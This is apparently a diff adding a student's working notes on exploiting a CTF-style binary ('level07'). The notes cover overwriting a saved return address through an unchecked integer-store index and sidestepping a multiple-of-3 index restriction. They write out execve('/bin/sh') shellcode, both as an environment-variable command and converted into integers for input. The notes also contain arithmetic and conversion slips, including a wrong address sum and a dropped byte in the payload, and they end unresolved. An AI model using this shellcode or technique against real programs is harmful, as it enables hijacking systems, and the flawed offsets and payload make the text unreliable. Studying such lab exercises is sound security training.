@@ -1,1 +1,77 @@
-We can read up to index 686, after that we get a segfault
+We can read up to index 686, after that we get a segfault as well as store
+
+The attack is most likely a buffer overflow we have to perform by storing numbers directly, but it's tricky since we cannot put at an index multiple of 3
+and there is the stack canary, the canary is just a value located at the bounds of the stack which is checked again on main return
+But looking at the code, since we can set any byte we want and it's not a char overflow, we can just set values outside the check range of the canary
+we have to find the right index to override one of the EIP saves on the stack
+
+EIP save (on GDB) is stored at    0xffffd6ec
+Numbers buffer (on GDB) starts at 0xffffd524
+
+we need 0x1C8 (456) bytes to reach EIP, so 114 ints
+so EIP should be overridable
+we can verify by doing a read with index 114 in the program
+and it prints 4158936339 (0xF7E45513 in hex) so it's the right index
+
+Now we should be able to just add a shellcode in the environment and jump to it
+the check (if number begins with 0x7b) should cause problem since environments variable starts with 0xffff)
+So just try with the same shellcode as before:
+
+env -i SHELL="/bin/bash" PWD="$HOME" SHELLCODE="$(python -c 'print "\x90"*1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')"
+
+in GDB, using 'x/s *((char **) environ)' we can find env variable address
+0xffffdb6d+0xa ('SHELLCODE=' size = 0xa) = 0xffffdb6e
+add 500 to be in middle of NOPS:
+0xffffdb6e+500 = 0xffffdd62
+
+We need to convert the address to decimal since scanf expects an unsigned int
+0xffffdd62 = 4294958434 
+
+So we should input index: 114 and number: 4294958434
+
+And it doesn't work, we didn't check but 114 is a multiple of 3, so we cannot use it to store a number, we need to find another EIP save to override
+The thing is, since other functions are called after main, they are on top of stack (so addressses are lower) and we cannot overflow to reach them
+we are forced to find something to override that is located before main on stack (so with higher address)
+
+by doing 'objdump -d ./level07 | grep ret' we find around 15 ret's, we just need one that has the EIP associated stored lower on the stack (higher address)
+so basically a function that is called before main
+
+0x08048ac5 (located in _fini), EIP save stored at address 0xffffd8ec
+0xffffd8ec - 0xffffd524 = 0x3C8 (968) bytes, so 242 ints, it's not divisble by 3 so it's good
+so we should input index: '242' and number: '4294958434'
+
+except that, after trying it in gdb, we see that we reaching _fini, the env is already unset, so the shellcode is not present anymore, so try a closer ret
+so we just looked at main eip, with gdb found out that it comes from __libc_start_main+243, but we cannot find any ret, so _fini seems to be the only option
+
+What we can do is take our shellcode, convert every 8 bytes to an unsigned integer and input it manually 4 bytes at a time, then jump to the buffer and tadaa
+
+we restarted gdb so buffer is now at addres 0xffffd814
+
+so now fini index is
+0xffffd8ec - 0xffffd814 = 0xd8 (216) in int = 54
+
+shell code in full hex is 
+\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+with strings as hex:
+\x31\xC0\x31\xDB\xB0\x06\xCD\x80\x53\x68
+\x2F\x74\x74\x79
+\x68
+\x2F\x64\x65\x76
+\xE3\x31\xC9\x66\xB9\x12\x27\xB0\x05\xCD\x80\x31\xC0\x50\x68
+\x2F\x2F\x73\x68
+\x68
+\x2F\x62\x69\x6E
+\x89\xE3\x50\x53\x89\xE1\x99\xB0\x0B\xCD\x80
+
+one line:
+\x31\xC0\x31\xDB\xB0\x06\xCD\x80\x53\x68\x2F\x74\x74\x79\x68\x2F\x64\x65\x76\xE3\x31\xC9\x66\xB9\x12\x27\xB0\x05\xCD\x80\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\x99\xB0\x0B\xCD\x80
+
+so in 4 bytes hex it is (54 chars):
+
+0x31C031DB 0xB006CD80 0x53682F74 0x7479682F 0x646576E3 0x31C966B9 0x1227B005 0xCD8031C0 0x50682F2F 0x7368682F 0x62696E89 0xE3505389 0xE199B00B 0xCD80
+
+in decimal (https://www.convzone.com/hex-to-decimal/):
+834679259 2953235840 1399336820 1954113583 1684371171 835282617 304590853 3447730624 1349005103 1936222255 1651076745 3813692297 3784945675 52608
+
+
+im blocked on offset 0xffffd814 its so weird idk why it changed and now im cringed
